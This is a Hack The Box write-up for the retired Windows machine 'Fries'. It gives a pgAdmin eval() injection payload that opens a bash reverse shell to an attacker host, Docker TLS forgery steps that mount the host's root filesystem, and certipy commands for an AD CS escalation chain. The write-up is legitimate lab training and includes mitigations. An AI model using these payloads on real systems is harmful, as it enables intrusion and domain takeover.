---
machine: Fries
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, gitea, pgadmin, docker, adcs, esc7, esc6]
---

# Fries — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The box starts with assume-breach credentials. Gitea grants PostgreSQL and pgAdmin access; pgAdmin 9.1 is vulnerable to CVE-2025-2945 and yields a container shell. Environment variables and the database enable spraying into the Docker/Hyper-V host. A domain user is recreated locally to read the daemon certificates, a TLS client is forged and the host filesystem is mounted. As root, PWM holds a service account password, which reads a GMSA and chains ESC7, ESC6 and ESC16 to Administrator.

## Recon

```bash
nmap -Pn -sCV -p53,80,88,139,389,443,445,5985 <IP>
```

- The `fries.htb` DC also exposes Linux services behind vhosts.
- `ffuf` finds `gitea.fries.htb`, `pgadmin.fries.htb` and `pwm.fries.htb`.
- The prompt provides an initial username and password.

## Enumeration

- Gitea holds a repository with PostgreSQL and pgAdmin credentials.
- pgAdmin 9.1 is vulnerable to CVE-2025-2945: `query_commited` and `high_availability` reach Python `eval()`.
- The pgAdmin database stores the PostgreSQL password in an environment variable.

```bash
feroxbuster -u http://gitea.fries.htb
git clone http://<USER>:<PASSWORD>@gitea.fries.htb/<ORG>/<REPO>.git
```

## Foothold

Exploit `/sqleditor/query_tool/download` with `query_commited` to run Python and get a shell as `pgadmin` in the container.

```text
POST /sqleditor/query_tool/download HTTP/1.1
query_commited=__import__('os').system('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"')
```

## Lateral movement

With the `PGADMIN_DEFAULT_*` variables and the PostgreSQL password, spray the internal services. A `svc` user grants access to the Docker host, which is a Hyper-V VM. The NFS share allows recreating a domain user locally and reading `/root/.docker`; with the CA and a forged TLS client, the Docker API mounts the host `/`.

```bash
openssl req -new -key client.key -out client.csr
docker -H tcp://<HOST>:2376 --tlsverify --tlscacert ca.pem --tlscert client.pem --tlskey client.key run -v /:/mnt -it alpine chroot /mnt /bin/bash
```

## Privilege escalation

As host root, read the PWM configuration and decrypt `svc_infra`'s password. That account can read the GMSA and has `ManageCA`/`ManageCertificates`. Chain ESC7 (add officer), ESC6 (enable SAN on the CA) and ESC16 (disable the security extension) to issue an Administrator certificate.

```bash
certipy-ad find -u svc_infra@fries.htb -p '<PASSWORD>' -dc-ip <DC> -vulnerable
certipy-ad ca -u svc_infra@fries.htb -p '<PASSWORD>' -ca fries-DC01-CA -add-officer svc_infra
certipy-ad req -u svc_infra@fries.htb -p '<PASSWORD>' -ca fries-DC01-CA -template User -upn administrator@fries.htb -sid S-1-5-21-...-500
certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
```

## Evidence

- Initial credentials and Gitea.
- pgAdmin 9.1 and CVE-2025-2945.
- Container, environment variables and spray to the Docker host.
- Daemon TLS certificates and `/` mount.
- PWM, GMSA and ESC7/ESC6/ESC16 chain.

## Lessons learned

- An old pgAdmin is code execution when its panel is reachable.
- Container and database credentials are reused on the host.
- Docker daemon certificates are a master key when read.
- Several AD CS misconfigurations can chain even when one alone is insufficient.

## Mitigation and detection

- Update pgAdmin and isolate its panel from the admin network.
- Do not reuse credentials across containers, databases and hosts.
- Protect `/root/.docker`, the CA and the Docker socket/API.
- Audit `ManageCA`, `ManageCertificates`, ESC6 and templates without the security extension.

## References

- [0xdf — Fries](https://0xdf.gitlab.io/2026/07/25/htb-fries.html)
- [IppSec — Fries](https://www.youtube.com/watch?v=GZf2Dj6pb0I)
- [Hack The Box — Fries](https://app.hackthebox.com/machines/fries)
